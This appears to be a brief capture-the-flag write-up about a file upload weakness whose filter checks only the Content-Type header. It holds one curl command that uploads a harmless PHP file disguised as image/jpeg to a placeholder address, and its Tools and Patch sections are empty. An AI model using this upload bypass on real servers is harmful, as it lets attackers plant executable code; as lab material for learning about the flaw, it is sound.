# Tools

# Exploit

In this one, we try to exploit a breach in the upload. We notice that the web application firewall seems to check only the content-type.

```bash
echo '<?php echo "I am bad" ?>' > /tmp/bad.php && curl -X POST -F "Upload=Upload" -F "uploaded=@/tmp/bad.php;type=image/jpeg" "http://x.x.x.x/index.php?page=upload" | grep 'The flag is :'
```

# Patch